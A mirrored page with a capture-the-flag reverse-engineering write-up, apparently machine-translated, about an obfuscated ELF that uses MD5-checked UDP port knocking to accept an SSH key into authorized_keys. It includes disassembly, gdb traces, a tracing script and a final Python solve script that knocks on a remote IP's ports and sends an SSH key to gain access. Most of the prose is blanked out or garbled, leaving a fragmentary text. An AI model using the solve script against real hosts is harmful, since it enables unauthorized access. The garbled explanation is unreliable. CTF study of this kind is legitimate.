0000000000000000 0 FUNC GLOBAL DEFAULT UND fopen@GLIBC_2.2.5 (2) # readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep write 32: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fwrite@GLIBC_2.2.5 (2)</span></span></code> </pre> <br>  Tabel simbol juga berisi fungsi untuk bekerja dengan soket, untuk membuat proses dan untuk menghitung MD5. <br><br>  Kebalikan dari file tersebut menunjukkan adanya sejumlah besar lompatan (semacam kebingungan).  Pada saat yang sama, lompatan dilakukan di antara blok kode, yang secara umum dapat dibagi menjadi beberapa jenis: <br><br><ul><li>    ¬´            OF ¬ª,   (  objdump): <br><br><pre> <code class="bash hljs"> 95b69b: 48 0f 44 c7 cmove rax,rdi 95b69f: 48 83 e7 01 and rdi,0x1 95b6a3: 4d 31 dc xor r12,r11 95b6a6: 71 05 jno 95b6ad &lt;MD5_Final@@Base+0x2d83f9&gt; 95b6a8: e9 f4 bf e1 ff jmp 7776a1 &lt;MD5_Final@@Base+0xf43ed&gt; 95b6ad: e9 1f 1a de ff jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt;</code> </pre> <br>  ,     OF        ¬´xor¬ª, ¬´and¬ª  . </li><li> ,       .            .      ,  : <br><br><pre> <code class="bash hljs">95b401: c7 04 25 2b b4 95 00 mov DWORD PTR ds:0x95b42b,0x34be74 95b408: 74 be 34 00 95b40c: 66 c7 04 25 01 b4 95 mov WORD PTR ds:0x95b401,0x13eb 95b413: 00 eb 13 95b416: 4c 0f 44 da cmove r11,rdx 95b41a: 48 d1 ea shr rdx,1 95b41d: 48 0f 44 ca cmove rcx,rdx 95b421: 49 89 d3 mov r11,rdx 95b424: 48 89 ca mov rdx,rcx 95b427: 4c 89 da mov rdx,r11 95b42a: e9 8d ad e7 00 jmp 17d61bc</code> </pre> </li><li>  ,      . </li></ul><br>            MD5.       ,       .       ¬´ <b>MD5_Init</b> ¬ª, ¬´ <b>MD5_Update</b> ¬ª  ¬´ <b>MD5_final</b> ¬ª. <br><br>  ,         API        .    ,     ,   ,      ,     .       . <br><br>   ELF  .    ¬´/home/task/.ssh/¬ª   . <br><br>     . ,        , ,    .     . Netstat     5432 (UDP). <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># netstat -ulnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:5432 0.0.0.0:* 13611/./UwRJ8iaEEd4</span></span></code> </pre> <br>                (4 )   : <br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#echo "test" &gt; /dev/udp/127.0.0.1/5432 # Verifying 74657374 009ec3b8</span></span></code> </pre> <br>           . <br>  ‚Äì    gdb.   ,   ,    recvfrom  backtrace.     0x6ae010. <br><br><div class="spoiler"> <b class="spoiler_title"> </b> <div class="spoiler_text"><pre> <code class="bash hljs">6ae00b: e8 d0 2b d5 ff call 400be0 &lt;recvfrom@plt&gt; 6ae010: e9 64 bc ea ff jmp 559c79 &lt;MD5_Update@@Base+0x953fc&gt; 559c79: 89 45 80 mov DWORD PTR [rbp-0x80],eax 559c7c: 83 f8 ff cmp eax,0xffffffff <span class="hljs-comment"><span class="hljs-comment">#   ,  -1 559c7f: 0f 84 62 7f 1c 00 je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; 559c85: e9 8a d6 2c 00 jmp 827314 &lt;MD5_Final@@Base+0x1a4060&gt; 827314: 48 c7 c7 30 d1 f0 00 mov rdi,0xf0d130 82731b: 48 29 27 sub QWORD PTR [rdi],rsp 82731e: 48 89 df mov rdi,rbx 827321: e8 5f 94 fe ff call 810785 &lt;MD5_Final@@Base+0x18d4d1&gt; 827326: e9 d7 a5 2d 00 jmp b01902 &lt;MD5_Init@@Base+0x7569&gt; b01902: 85 c0 test eax,eax b01904: 0f 84 dd 02 c2 ff je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; b0190a: e9 7c a9 bb ff jmp 6bc28b &lt;MD5_Final@@Base+0x38fd7&gt;</span></span></code> </pre> <br></div></div><br>       0x810758    . <br>  break  0xb01902,    . <br><br><div class="spoiler"> <b class="spoiler_title">  ( rax)</b> <div class="spoiler_text"> (gdb) b *0xb01902 <br> Breakpoint 2 at 0xb01902 <br> (gdb) c <br> Continuing. <br> Verifying 74657374 <br> 00f82488 <br><br> Breakpoint 2, 0x0000000000b01902 in MD5_Init () <br> (gdb) info reg rax <br> rax 0x0 0 <br></div></div><br>  0   . , ,          0. <br><br>       gdb,     <b>MD5_Update</b>     (  ¬´test¬ª). <br><br><div class="spoiler">  <b class="spoiler_title">Hasil</b> <div class="spoiler_text"><pre> <code class="bash hljs">(gdb) b MD5_Update Breakpoint 3 at 0x4c487d (2 locations) (gdb) c Continuing. Verifying 74657374 Breakpoint 3, 0x00000000004c487d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> MD5_Update () (gdb) info reg rsi rsi 0x7fffffffdd90 140737488346512 (gdb) x/20bx <span class="hljs-variable"><span class="hljs-variable">$rsi</span></span> 0x7fffffffdd90: 0x74 0x65 0x73 0x74 0x0a 0xff 0x7f 0x00 0x7fffffffdd98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdda0: 0x00 0x00 0x00 0x00 (gdb) info reg <span class="hljs-variable"><span class="hljs-variable">$rdx</span></span> rdx 0x200 512</code> </pre> <br></div></div><br><h4>  Hasil </h4><br> MD5     ,     512 .   , ,  MD5         512  .     8 ,    8  ,   .   ,   - .     4        3  MD5-   . <br><br>    0x810758     0.      RAX.      2       0x810758      0x827326. <br><br>  ,    0x810758.   gdb : <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> gdb <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">"flow.log"</span></span>, <span class="hljs-string"><span class="hljs-string">"w"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fw: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: s = gdb.execute(<span class="hljs-string"><span class="hljs-string">"info reg rip"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) s = s[s.find(<span class="hljs-string"><span class="hljs-string">"0x"</span></span>):] gdb.execute(<span class="hljs-string"><span class="hljs-string">"ni"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) address = s.split(<span class="hljs-string"><span class="hljs-string">"\t"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip() fw.write(address + <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>) address = int(address, <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> address == <span class="hljs-number"><span class="hljs-number">0x827326</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span></code> </pre><br>   <b>flow.log</b>         .   ,     ,      . <br>   ¬´ <b>disasm.log</b> ¬ª     objdmp     ¬´ <b>: </b> ¬ª   . <br><br><div class="spoiler"> <b class="spoiler_title">   </b> <div class="spoiler_text"><pre> <code class="python hljs">F_NAME = <span class="hljs-string"><span class="hljs-string">"disasm.log"</span></span> F_FLOW = <span class="hljs-string"><span class="hljs-string">"flow.log"</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">prepare_code_flow</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f_path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(f_path, <span class="hljs-string"><span class="hljs-string">"rb"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fr: data = fr.readlines() data = filter(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> x: x, data) start_address = long(data[<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) end_address = long(data[<span class="hljs-number"><span class="hljs-number">-1</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) res = [<span class="hljs-string"><span class="hljs-string">""</span></span>] * (end_address - start_address + <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> data: _d = _d.split(<span class="hljs-string"><span class="hljs-string">":"</span></span>) res[long(_d[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip(), <span class="hljs-number"><span class="hljs-number">16</span></span>) - start_address] = <span class="hljs-string"><span class="hljs-string">""</span></span>.join(_d[<span class="hljs-number"><span class="hljs-number">1</span></span>:]).strip() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> start_address, res <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parse_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> mnem = code[:<span class="hljs-number"><span class="hljs-number">7</span></span>].strip() ops = code[<span class="hljs-number"><span class="hljs-number">7</span></span>:].split(<span class="hljs-string"><span class="hljs-string">","</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [mnem] + ops <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">process_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> parse_data = parse_instruction(code) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> parse_data[<span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> [<span class="hljs-string"><span class="hljs-string">"rax"</span></span>, <span class="hljs-string"><span class="hljs-string">"eax"</span></span>, <span class="hljs-string"><span class="hljs-string">"al"</span></span>]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: <span class="hljs-comment"><span class="hljs-comment"># Prepare disassemble data start_address, codes = prepare_code_flow(F_NAME) with open(F_FLOW, "rb") as fr: lines = fr.readlines() lines.reverse() lines = filter(lambda x: x, lines) count = 0 for _l in lines: offset = long(_l.strip(), 16) - start_address if process_instruction(codes[offset]): print str(count) + " " + hex(offset + start_address) + " " + codes[offset] break count += 1 continue</span></span></code> </pre> <br><br></div></div><br>   ¬´¬ª       ,         RAX.  Hasil: <br> <code>0x67c27c mov DWORD PTR [rbp-0x14], 0x0</code> <br>    .      -  ( ¬´ <b>flow.log</b> ¬ª): <br><br><pre> <code class="plaintext hljs">95b6ad: jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt; 95b6b2: cmp DWORD PTR [rbp-0x2d4],0x133337 95b6bc: jne 67c270 &lt;MD5_Update@@Base+0x1b79f3&gt;</code> </pre> <br>  0x95b6b2 ‚Äì     0x133337.  , ,   [rbp-0x2d4].       ¬´testtest¬ª: <br><br><pre> <code class="plaintext hljs"># echo -n "testtest" &gt; md5.bin # truncate -s 512 md5.bin # md5sum md5.bin e9b9de230bdc85f3e929b0d2495d0323 md5.bin # echo -n "testtest" &gt; /dev/udp/127.0.0.1/5432 (gdb) b *0x95b6b2 Breakpoint 6 at 0x95b6b2 (gdb) c Continuing. Verifying 74657374 00deb9e9 Breakpoint 6, 0x000000000095b6b2 in MD5_Final () (gdb) x/20bx $rbp-0x2d4 0x7fffffffdd7c: 0xe9 0xb9 0xde 0x00 0xe9 0xb9 0xde 0x23 0x7fffffffdd84: 0x0b 0xdc 0x85 0xf3 0xe9 0x29 0xb0 0xd2 0x7fffffffdd8c: 0x49 0x5d 0x03 0x23</code> </pre> <br>   3   MD5-.     MD5-   3  ¬´\x37\x33\x13¬ª. <br><br>             MD5   .     .              : <br><br><pre> <code class="plaintext hljs">New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...3 14235 0</code> </pre><br> Netstat    ,     .  ps      ().  ,         . <br><br>      5432,      14235.  .   .      , , MD5   .  ,       .      MD5,    14235.  ,     MD5.  ,    . <br><br><div class="spoiler">  <b class="spoiler_title">Hasil</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">Binding 22 Waiting for data...Verifying 1BFFFFFFD1FFFFFF8B50 00133337 New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...Received packet from 127.0.0.1:43614 Data: 3 14235 27 Next port 23038 Binding 23038 Waiting for data...4</code> </pre> <br></div></div><br>   .    ,      ‚Ä¶ <br>   ,     (31841)  .      gdb       ,    ¬´/home/task/.ssh/authorized_keys¬ª. <br><br>        ,      .       ,          ( ,     ). <br><br>   RSA    . <br><br>      SSH,    . <br><br>          MD5-.        ,          (    ).     ,     4    (   MD5)    int  ,         (  ). <br><br><div class="spoiler"> <b class="spoiler_title"> ,     RSA,   .</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> SocketServer <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> select d = [<span class="hljs-string"><span class="hljs-string">'\x1b\xd1\x8bP\x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'\x16\xbc\xf9 \x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'"\xa5I\x90\x00\x00\x00\x00\x00\x00'</span></span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 1"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">0</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 2"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">1</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 3"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">2</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 4"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">41357</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 5"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x04"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">42381</span></span>)) <span class="hljs-comment"><span class="hljs-comment"># for i in range(256): time.sleep(0.2) print "Send 6" s.sendto("\x02", ("95.216.185.52", 28709)) # Read key with open("ssh_key.txt", "rb") as fr: data = fr.read() print len(data) print "Send 7" s.sendto(data, ("95.216.185.52", 28709)) print s.recvfrom(1500) s.close()</span></span></code> </pre> <br></div></div><br>  : <b>flag{a1ec3c43cae4250faa302c412c7cc524}</b> <br><br>     ¬´OK¬ª  . <br><br>  ,   ,       MD5-.  ,      ,  . <br><br>  ,   ,  40       ,    .  Terima kasih </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id440312/">https://habr.com/ru/post/id440312/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id440302/index.html">CRM - biaya kesuksesan, biaya kesalahan, biaya kepemilikan</a></li>
<li><a href="../id440304/index.html">Mengganggu dari perangkat eksternal dalam sistem x86. Bagian 3. Mengkonfigurasi perutean interupsi dalam chipset menggunakan contoh coreboot</a></li>
<li><a href="../id440306/index.html">Penskalaan basis data dalam sistem yang sangat dimuat</a></li>
<li><a href="../id440308/index.html">Bagilah dan taklukkan, atau tulis dengan lambat - baca dengan cepat</a></li>
<li><a href="../id440310/index.html">Cara mengajar mesin untuk memahami faktur dan mengekstrak data dari mereka</a></li>
<li><a href="../id440314/index.html">Kandidat Rilis JDK 12: Shenandoah, G1, JMH, Arm64. Bug di Swing menyerang balik</a></li>
<li><a href="../id440316/index.html">Distribusi titik yang seragam dalam suatu segitiga</a></li>
<li><a href="../id440318/index.html">GDPR: cara bekerja dengan data pribadi karyawan, pekerja lepas, dan karyawan rekanan Eropa</a></li>
<li><a href="../id440320/index.html">Seperti yang kami lakukan di konter DMRSE Yandex</a></li>
<li><a href="../id440322/index.html">Mengapa HDD menjadi lebih kecil kemungkinannya untuk gagal</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>